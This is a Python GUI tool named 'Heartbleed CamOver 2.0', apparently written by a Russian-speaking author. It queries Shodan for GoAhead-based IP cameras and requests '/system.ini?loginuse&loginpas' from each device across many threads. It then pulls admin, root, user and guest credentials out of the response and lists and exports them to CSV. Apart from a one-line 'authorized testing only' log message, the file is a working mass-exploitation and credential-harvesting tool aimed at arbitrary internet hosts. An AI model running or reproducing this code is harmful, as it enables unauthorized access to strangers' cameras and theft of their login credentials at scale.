import os
import sys
import subprocess

os.environ["TK_SILENCE_DEPRECATION"] = "1"

def _install_dependencies():
    packages = ["customtkinter", "requests", "shodan"]
    commands = [
        [sys.executable, "-m", "pip", "install", "--upgrade", *packages],
        [sys.executable, "-m", "pip", "install", "--user", "--upgrade", *packages],
        [sys.executable, "-m", "pip", "install", "--break-system-packages", "--upgrade", *packages],
    ]
    for cmd in commands:
        try:
            subprocess.check_call(cmd)
            return
        except Exception:
            continue
    raise SystemExit("Не получилось установить зависимости. Установи вручную: pip install customtkinter requests shodan")

if not getattr(sys, "frozen", False):
    try:
        import tkinter
    except Exception:
        raise SystemExit("Tkinter не найден.")
    try:
        import customtkinter as ctk
        import requests
        from shodan import Shodan
    except ImportError:
        _install_dependencies()
        import customtkinter as ctk
        import requests
        from shodan import Shodan
else:
    import customtkinter as ctk
    import requests
    from shodan import Shodan

import re
import time
import csv
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from requests.adapters import HTTPAdapter
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

APP_TITLE = "Heartbleed CamOver 2.0"
DEFAULT_QUERY = "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        self.geometry("1100x750")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        self.configure(fg_color="#0a0a0a")

        self.ui_q = queue.Queue()
        self.stop_event = threading.Event()
        self.scanning = False
        self.submitted = 0
        self.scanned = 0
        self.vuln = 0
        self.safe = 0
        self.vuln_data = []
        self.show_var = ctk.BooleanVar()

        self._build_ui()
        self._log("[*] Ready. Use only for authorized testing.", "info")
        self.after(100, self._poll_queue)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _build_ui(self):
        header = ctk.CTkFrame(self, fg_color="transparent")
        header.pack(fill="x", padx=20, pady=(20, 10))
        ctk.CTkLabel(header, text="HEARTBLEED CAMOVER 2.0", font=ctk.CTkFont(size=24, weight="bold"), text_color="#ff3333").pack(side="left")
        
        ctrl = ctk.CTkFrame(self, fg_color="#1a1a1a", corner_radius=10)
        ctrl.pack(fill="x", padx=20, pady=10)
        
        r1 = ctk.CTkFrame(ctrl, fg_color="transparent")
        r1.pack(fill="x", padx=15, pady=(15, 5))
        ctk.CTkLabel(r1, text="Shodan API Key:", text_color="white").pack(side="left", padx=(0, 10))
        self.api_entry = ctk.CTkEntry(r1, width=400, show="*", placeholder_text="Enter API Key", fg_color="#222222", border_color="#333333")
        self.api_entry.pack(side="left", padx=(0, 10))
        ctk.CTkCheckBox(r1, text="Show", variable=self.show_var, command=self._toggle_show, width=60, fg_color="#ff3333", hover_color="#cc0000").pack(side="left")
        
        r2 = ctk.CTkFrame(ctrl, fg_color="transparent")
        r2.pack(fill="x", padx=15, pady=(5, 15))
        
        ctk.CTkLabel(r2, text="Threads:", text_color="white").pack(side="left", padx=(0, 5))
        self.threads_entry = ctk.CTkEntry(r2, width=60, placeholder_text="100", fg_color="#222222", border_color="#333333")
        self.threads_entry.insert(0, "100")
        self.threads_entry.pack(side="left", padx=(0, 15))
        
        ctk.CTkLabel(r2, text="Max Targets (0=Unlimited):", text_color="white").pack(side="left", padx=(0, 5))
        self.max_entry = ctk.CTkEntry(r2, width=80, placeholder_text="0", fg_color="#222222", border_color="#333333")
        self.max_entry.insert(0, "100")
        self.max_entry.pack(side="left", padx=(0, 15))
        
        self.start_btn = ctk.CTkButton(r2, text="START SCAN", fg_color="#cc0000", hover_color="#990000", command=self._start_scan, width=120)
        self.start_btn.pack(side="left", padx=(0, 10))
        
        self.stop_btn = ctk.CTkButton(r2, text="STOP", fg_color="#444444", hover_color="#333333", command=self._stop_scan, width=80, state="disabled")
        self.stop_btn.pack(side="left", padx=(0, 10))
        
        self.export_btn = ctk.CTkButton(r2, text="EXPORT CSV", fg_color="#222222", hover_color="#111111", command=self._export_csv, width=100)
        self.export_btn.pack(side="left")

        stats = ctk.CTkFrame(self, fg_color="#1a1a1a", corner_radius=10, height=80)
        stats.pack(fill="x", padx=20, pady=10)
        stats.pack_propagate(False)
        
        self.stat_found = self._make_stat(stats, "FOUND", "0", "#ff3333")
        self.stat_scanned = self._make_stat(stats, "SCANNED", "0", "#aaaaaa")
        self.stat_vuln = self._make_stat(stats, "VULNERABLE", "0", "#00cc44")
        self.stat_safe = self._make_stat(stats, "SAFE", "0", "#666666")
        
        content = ctk.CTkFrame(self, fg_color="transparent")
        content.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        left = ctk.CTkFrame(content, fg_color="#1a1a1a", corner_radius=10)
        left.pack(side="left", fill="both", expand=True, padx=(0, 10))
        
        ctk.CTkLabel(left, text="VULNERABLE DEVICES", font=ctk.CTkFont(weight="bold"), text_color="#00cc44").pack(anchor="w", padx=15, pady=(15, 5))
        
        tree_frame = tk.Frame(left, bg="#1a1a1a")
        tree_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("Treeview", background="#111111", foreground="#ffffff", fieldbackground="#111111", rowheight=25, font=("Consolas", 10))
        style.configure("Treeview.Heading", background="#222222", foreground="#ff3333", font=("Consolas", 10, "bold"))
        style.map("Treeview", background=[("selected", "#00cc44")], foreground=[("selected", "#000000")])
        
        self.tree = ttk.Treeview(tree_frame, columns=("address", "creds", "org", "cc"), show="headings")
        self.tree.heading("address", text="ADDRESS")
        self.tree.heading("creds", text="CREDENTIALS")
        self.tree.heading("org", text="ORG")
        self.tree.heading("cc", text="CC")
        
        self.tree.column("address", width=140, anchor="w")
        self.tree.column("creds", width=200, anchor="w")
        self.tree.column("org", width=120, anchor="w")
        self.tree.column("cc", width=40, anchor="center")
        
        self.tree.tag_configure("vuln", background="#00cc44", foreground="#000000", font=("Consolas", 10, "bold"))
        
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        self.tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        right = ctk.CTkFrame(content, fg_color="#1a1a1a", corner_radius=10, width=350)
        right.pack(side="right", fill="y", padx=(10, 0))
        right.pack_propagate(False)
        
        ctk.CTkLabel(right, text="LIVE LOG", font=ctk.CTkFont(weight="bold"), text_color="#ff3333").pack(anchor="w", padx=15, pady=(15, 5))
        
        self.log_text = tk.Text(right, bg="#050505", fg="#cccccc", font=("Consolas", 10), state="disabled", wrap="word", highlightthickness=0, bd=0)
        self.log_text.pack(fill="both", expand=True, padx=15, pady=(0, 15))
        
        self.log_text.tag_configure("info", foreground="#aaaaaa")
        self.log_text.tag_configure("success", foreground="#00cc44", font=("Consolas", 10, "bold"))
        self.log_text.tag_configure("error", foreground="#ff3333")
        self.log_text.tag_configure("warn", foreground="#ffaa00")

    def _make_stat(self, parent, title, value, color):
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(side="left", fill="both", expand=True, padx=10, pady=15)
        ctk.CTkLabel(frame, text=title, font=ctk.CTkFont(size=12, weight="bold"), text_color="#888888").pack()
        lbl = ctk.CTkLabel(frame, text=value, font=ctk.CTkFont(size=24, weight="bold"), text_color=color)
        lbl.pack()
        return lbl

    def _toggle_show(self):
        self.api_entry.configure(show="" if self.show_var.get() else "*")

    def _log(self, text, tag="info"):
        self.log_text.configure(state="normal")
        self.log_text.insert("end", text + "\n", tag)
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    def _clear_ui(self):
        if self.scanning: return
        for iid in self.tree.get_children(): self.tree.delete(iid)
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
        self.vuln_data.clear()
        self.submitted = self.scanned = self.vuln = self.safe = 0
        self.stat_found.configure(text="0")
        self.stat_scanned.configure(text="0")
        self.stat_vuln.configure(text="0")
        self.stat_safe.configure(text="0")

    def _start_scan(self):
        if self.scanning: return
        api_key = self.api_entry.get().strip()
        if not api_key:
            messagebox.showwarning(APP_TITLE, "Введите Shodan API ключ.")
            return
        try: threads = int(self.threads_entry.get().strip() or "100")
        except Exception: threads = 100
        try: max_targets = int(self.max_entry.get().strip() or "0")
        except Exception: max_targets = 0

        threads = max(1, min(300, threads))
        max_targets = max(0, max_targets)
        self._clear_ui()
        self.scanning = True
        self.stop_event.clear()
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.export_btn.configure(state="disabled")
        threading.Thread(target=self._producer, args=(api_key, max_targets, threads), daemon=True).start()

    def _stop_scan(self):
        self.stop_event.set()
        self.stop_btn.configure(state="disabled")
        self._log("[!] Stop requested by user.", "warn")

    def _export_csv(self):
        if not self.vuln_data:
            messagebox.showinfo(APP_TITLE, "Нет уязвимых результатов для экспорта.")
            return
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")], initialfile="camover_vulns.csv")
        if not path: return
        try:
            with open(path, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["address", "creds", "org", "cc"])
                for row in self.vuln_data:
                    writer.writerow([row["address"], "; ".join(row["creds"]), row["org"], row["cc"]])
            self._log(f"[+] Exported {len(self.vuln_data)} devices to CSV.", "success")
        except Exception as exc:
            messagebox.showerror(APP_TITLE, f"Ошибка: {exc}")

    def _producer(self, api_key, max_targets, threads):
        work_q = queue.Queue()
        workers = [threading.Thread(target=self._exploit_worker, args=(work_q,), daemon=True) for _ in range(threads)]
        for t in workers: t.start()
        
        submitted = 0
        try:
            self.ui_q.put({"type": "log", "text": "[*] Authorizing Shodan by given API key...", "tag": "info"})
            api = Shodan(api_key)
            self.ui_q.put({"type": "log", "text": "[+] Authorization successfully completed!", "tag": "success"})
            
            page = 1
            while True:
                if self.stop_event.is_set(): break
                if max_targets != 0 and submitted >= max_targets: break
                    
                try:
                    results = api.search(DEFAULT_QUERY, page=page)
                    matches = results.get('matches', [])
                    if not matches: break
                        
                    for match in matches:
                        if max_targets != 0 and submitted >= max_targets: break
                        ip = match.get("ip_str")
                        port = match.get("port")
                        if ip and port:
                            work_q.put({"address": f"{ip}:{port}", "org": match.get("org", ""), "cc": match.get("location", {}).get("country_code", "")})
                            submitted += 1
                            
                    if len(matches) < 100: break
                    page += 1
                except Exception as e:
                    err_msg = str(e)
                    if "Insufficient" in err_msg or "credits" in err_msg.lower():
                        self.ui_q.put({"type": "log", "text": f"[!] Shodan API limit reached: {err_msg}", "tag": "warn"})
                    else:
                        self.ui_q.put({"type": "log", "text": f"[!] Shodan error: {err_msg}", "tag": "error"})
                    break
                    
            self.ui_q.put({"type": "submitted", "value": submitted})
            self.ui_q.put({"type": "log", "text": f"[+] Fetched {submitted} targets. Exploiting...", "tag": "success"})
            
        except Exception as exc:
            self.ui_q.put({"type": "log", "text": f"[!] Failed to authorize Shodan: {exc}", "tag": "error"})
        finally:
            for _ in workers: work_q.put(None)
            for t in workers: t.join()
            self.ui_q.put({"type": "finished"})

    def _exploit_worker(self, work_q):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
        session.mount("http://", adapter)
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        
        while True:
            target = work_q.get()
            if target is None: break
            if self.stop_event.is_set(): continue
                
            address = target["address"]
            creds = self._exploit(session, address)
            self.ui_q.put({"type": "result", "address": address, "creds": creds, "org": target.get("org", ""), "cc": target.get("cc", "")})

    @staticmethod
    def _exploit(session, address):
        try:
            response = session.get(f"http://{address}/system.ini?loginuse&loginpas", verify=False, timeout=3)
        except Exception:
            return []
            
        if response.status_code == 200:
            # Оригинал: re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
            strings = re.findall(r"[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
            creds = []
            seen = set()
            
            # Ищем admin, root и т.д. как в оригинале, но БЕЗ тупого фильтра на пароль
            targets = ["admin", "root", "user", "guest"]
            for t in targets:
                if t in strings:
                    idx = strings.index(t)
                    if idx + 1 < len(strings):
                        pwd = strings[idx + 1]
                        pair = f"{t}:{pwd}"
                        if pair not in seen:
                            seen.add(pair)
                            creds.append(pair)
            return creds
        return []

    def _poll_queue(self):
        try:
            while True:
                item = self.ui_q.get_nowait()
                t = item.get("type")
                if t == "log": self._log(item["text"], item.get("tag", "info"))
                elif t == "submitted":
                    self.submitted = item["value"]
                    self.stat_found.configure(text=str(self.submitted))
                elif t == "result":
                    self.scanned += 1
                    self.stat_scanned.configure(text=str(self.scanned))
                    if item["creds"]:
                        self.vuln += 1
                        self.stat_vuln.configure(text=str(self.vuln))
                        self.vuln_data.append({"address": item["address"], "creds": item["creds"], "org": item["org"], "cc": item["cc"]})
                        self.tree.insert("", 0, values=(item["address"], "; ".join(item["creds"]), item["org"], item["cc"]), tags=("vuln",))
                        self._log(f"[+] ({item['address']}) - {', '.join(item['creds'])}", "success")
                    else:
                        self.safe += 1
                        self.stat_safe.configure(text=str(self.safe))
                elif t == "finished":
                    self.scanning = False
                    self.start_btn.configure(state="normal")
                    self.stop_btn.configure(state="disabled")
                    self.export_btn.configure(state="normal")
                    self._log("[*] Scan finished.", "info")
        except queue.Empty:
            pass
        self.after(100, self._poll_queue)

    def _on_close(self):
        self.stop_event.set()
        self.destroy()

if __name__ == "__main__":
    app = App()
    app.mainloop()